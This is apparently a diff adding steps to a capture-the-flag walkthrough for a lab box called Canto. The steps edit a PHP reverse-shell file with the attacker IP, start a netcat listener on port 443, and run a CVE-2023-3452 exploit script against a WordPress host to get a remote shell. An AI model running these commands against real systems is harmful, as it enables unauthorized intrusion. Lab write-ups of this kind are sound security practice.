@@ -247,9 +247,30 @@ Then we have to copy all the code and create a nano file
 
 <img width="1013" height="812" alt="image" src="https://github.com/user-attachments/assets/6df23091-16cd-423e-957b-a9fccad11702" />
 
+IMPORTANTñ
+Inside of the nano we need to add the Attacker IP Address 
+
+<img width="420" height="204" alt="image" src="https://github.com/user-attachments/assets/4141301f-c8f5-458e-a750-15e498d9938a" />
+
+Ctrl  + o , Enter , Ctrl + x to save it 
 
 ┌──(r4v3x㉿kali)-[~/Desktop/Canto]
 └─$ nano Wordpress_virus.php
 
+We open the port 443 to listen 
 
-                                  
+┌──(r4v3x㉿kali)-[~/Desktop/Canto]
+└─$ sudo nc -nlvp 443                                                                          
+[sudo] password for r4v3x: 
+listening on [any] 443 ...
+
+Then from a new terminal we copy the full comand and change the information to the one we have     
+
+python3 CVE-2023-3452.py -u http://192.168.1.142 -LHOST 192.168.1.33 -NC_PORT 3333 -s php-reverse-shell.php
+
+┌──(r4v3x㉿kali)-[~/Desktop]
+
+└─$ python3 CVE-2023-3452.py -u http://192.168.15.16 -LHOST 192.168.15.15 -NC_PORT 444 -s Wordpress_virus.php 
+
+
+
